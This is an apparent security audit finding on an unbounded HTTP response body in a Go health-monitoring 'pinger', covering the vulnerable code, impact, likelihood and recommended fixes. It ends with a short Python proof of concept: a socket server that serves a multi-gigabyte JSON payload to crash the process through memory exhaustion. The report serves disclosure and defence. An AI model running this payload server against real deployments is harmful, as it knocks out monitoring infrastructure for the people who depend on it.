Audit Report

## Title
Unbounded Mirror-Node Response Body Causes OOM Crash in Pinger (`fetchMirrorNodeNetwork`)

## Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` reads the HTTP response body from the configured mirror node with no size cap before passing it to `json.NewDecoder(...).Decode()`. A malicious or compromised mirror node, or a MITM attacker on the plain-HTTP path, can return a crafted oversized JSON payload that exhausts the process's memory. With `GOMEMLIMIT: 10MiB` set in the Helm chart, even a modest oversized response is sufficient to crash the process, and because the call occurs at startup, the pinger will crash-loop indefinitely.

## Finding Description
**Exact code path — `pinger/mirror_node_client.go`, `fetchMirrorNodeNetwork()`, lines 95–110:**

```go
var payload nodesEnvelope
if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {   // line 96 – no MaxBytesReader
    return nil, false, fmt.Errorf("decode mirror nodes: %w", err)
}

for _, n := range payload.Nodes {                                      // line 102 – no node-count cap
    if n.NodeAccountID == "" {                                         // line 103 – only empty check
        continue
    }
    nodeAccountId, err := hiero.AccountIDFromString(n.NodeAccountID)  // line 107 – no length guard
    if err != nil {
        continue
    }
``` [1](#0-0) 

Three distinct missing controls are confirmed in the actual source:

1. **No `http.MaxBytesReader`**: `resp.Body` is passed directly to `json.NewDecoder` with no byte-limit wrapper.
2. **No node-count cap**: The `for _, n := range payload.Nodes` loop iterates over an arbitrarily large slice.
3. **No string-length guard**: The only check on `n.NodeAccountID` is `== ""` (line 103); a megabyte-scale string passes straight to `hiero.AccountIDFromString`.

The HTTP client timeout (`mirrorNodeClientTimeout`, default 10 s) only limits wall-clock time, not bytes transferred. A co-located or fast-network attacker can stream gigabytes within that window. [2](#0-1) 

## Impact Explanation
The pinger is the active health-monitoring component. Crashing it silently disables transfer-submission monitoring.

- `GOMEMLIMIT: 10MiB` is hard-coded in the Helm chart (line 17), and the container memory limit is `20Mi` (line 73). [3](#0-2) [4](#0-3) 

- `buildNetworkFromMirrorNodes` is called from `newClient` at startup (before any transfers), so a malicious response causes an immediate crash-loop: the pinger will never reach a healthy state as long as the malicious response is served. [5](#0-4) 

## Likelihood Explanation
Two realistic attacker positions exist:

1. **Malicious/compromised mirror-node operator**: The `network=other` path (the default in the Helm chart) trusts the configured mirror-node URL completely. Any operator pointing the pinger at an external mirror node is fully exposed. [6](#0-5) 

2. **Network MITM on plain HTTP**: The default Helm value is `http://{{ .Release.Name }}-restjava:80` — plain HTTP with no TLS. An attacker with access to the pod network (compromised sidecar, rogue CNI plugin, cloud-provider network-level attacker) can intercept and replace the response with no cryptographic barrier. [7](#0-6) 

## Recommendation
1. **Wrap `resp.Body` with `http.MaxBytesReader`** before decoding (e.g., 1 MiB limit):
   ```go
   resp.Body = http.MaxBytesReader(nil, resp.Body, 1<<20)
   ```
2. **Cap the number of nodes** after decoding (e.g., reject payloads with more than 1 000 entries).
3. **Add a string-length guard** on `n.NodeAccountID` before calling `hiero.AccountIDFromString` (e.g., `len(n.NodeAccountID) > 64`).
4. **Enable TLS** for the mirror-node REST endpoint, or at minimum document that plain-HTTP deployments are untrusted.

## Proof of Concept
```python
import json, socket, threading

# Craft a payload: 10 000 nodes each with a 1 MB node_account_id
big_str = "A" * (1024 * 1024)
payload = json.dumps({"nodes": [{"node_account_id": big_str, "service_endpoints": []} for _ in range(10_000)]})
headers = (
    "HTTP/1.1 200 OK\r\n"
    "Content-Type: application/json\r\n"
    f"Content-Length: {len(payload)}\r\n\r\n"
)

def handle(conn):
    conn.recv(4096)
    conn.sendall((headers + payload).encode())
    conn.close()

srv = socket.socket(); srv.bind(("0.0.0.0", 80)); srv.listen(5)
while True:
    handle(srv.accept()[0])
```
Point `HIERO_MIRROR_PINGER_REST` at this server. The pinger will attempt to decode ~10 GB of string data into `payload.Nodes`, immediately exceeding `GOMEMLIMIT=10MiB` and crashing. On restart it will crash again, producing an indefinite crash-loop.
